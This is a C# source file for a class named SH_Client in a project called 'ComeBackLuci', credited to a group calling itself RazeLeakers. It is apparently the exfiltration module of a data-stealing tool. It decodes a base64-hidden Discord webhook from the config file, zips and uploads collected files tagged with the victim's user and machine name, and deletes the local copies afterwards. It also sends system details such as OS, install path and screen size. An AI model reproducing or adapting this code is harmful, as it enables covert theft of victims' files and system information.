using System;
using System.Text;
using System.IO;
using System.IO.Compression;
using System.Configuration;
using System.Windows.Forms;
using Discord;
using Discord.Webhook;

namespace ComeBackLuci.Mirlif
{
    public static class SH_Client
    {
        private const string author = "M3RFR3T";
        private const string appName = "ComeBackLuci";
        private const string credit = "github.com/RazeLeakers";
        private const string avatarURL = "https://avatars.githubusercontent.com/u/154272786?s=200&v=4";

        public static async void SendFile(string fileSend)
        {
            if (!File.Exists(fileSend)) return;

            string webhook = ConfigurationManager.AppSettings["client"];

            if (string.IsNullOrWhiteSpace(webhook)) return;

            webhook = Encoding.Unicode.GetString(Convert.FromBase64String(webhook));

            string errorDir = Path.Combine(Path.GetDirectoryName(fileSend), "ErrorFiles");

            using (DiscordWebhookClient client = new DiscordWebhookClient(webhook))
            {
                if (Directory.Exists(errorDir))
                {
                    var cant = Directory.GetFiles(errorDir).Length;

                    if (cant != 0)
                    {
                        string zipSend = Path.Combine(Path.GetDirectoryName(fileSend), "cbl.zip");

                        try
                        {
                            ZipFile.CreateFromDirectory(errorDir, zipSend);

                            await client.SendFileAsync(zipSend, $"**Error ({cant})**", false, null, appName, avatarURL);

                            Directory.Delete(errorDir, true);
                        }
                        catch { }
                        finally { if (File.Exists(zipSend)) File.Delete(zipSend); }
                    }
                    else Directory.Delete(errorDir);
                }

                try
                {
                    await client.SendFileAsync(fileSend, $"**{Environment.UserName} - {Environment.MachineName}**", false, null, appName, avatarURL);
                    
                    File.Delete(fileSend);
                }
                catch
                {
                    if (!Directory.Exists(errorDir)) Directory.CreateDirectory(errorDir);

                    File.Move(fileSend, Path.Combine(errorDir, Path.GetFileName(fileSend)));
                }
            }
        }

        public static async void SendMessage(string webhook)
        {
            if (string.IsNullOrWhiteSpace(webhook)) return;

            EmbedBuilder eb = new EmbedBuilder();
            eb.WithColor(Color.Green);
            eb.AddField("Install path:", $"{Application.StartupPath}");
            eb.AddField("OS:", $"{Environment.OSVersion}");
            eb.AddField("User:", $"{Environment.UserName}");
            eb.AddField("Machine:", $"{Environment.MachineName}");
            eb.AddField("Processor: ", $"{Environment.ProcessorCount}");
            eb.AddField("Screen: ", $"{Screen.PrimaryScreen.Bounds.Size.Width} x {Screen.PrimaryScreen.Bounds.Size.Height}");
            eb.WithFooter($"{credit} | {author}");

            using (DiscordWebhookClient client = new DiscordWebhookClient(webhook))
            {
                try
                {
                    await client.SendMessageAsync(null, false, embeds: new Embed[] { eb.Build() }, appName, avatarURL);
                    MessageBox.Show("Send!", appName, MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch
                {
                    MessageBox.Show("Error please verify the client!", appName, MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
        }
    }
}
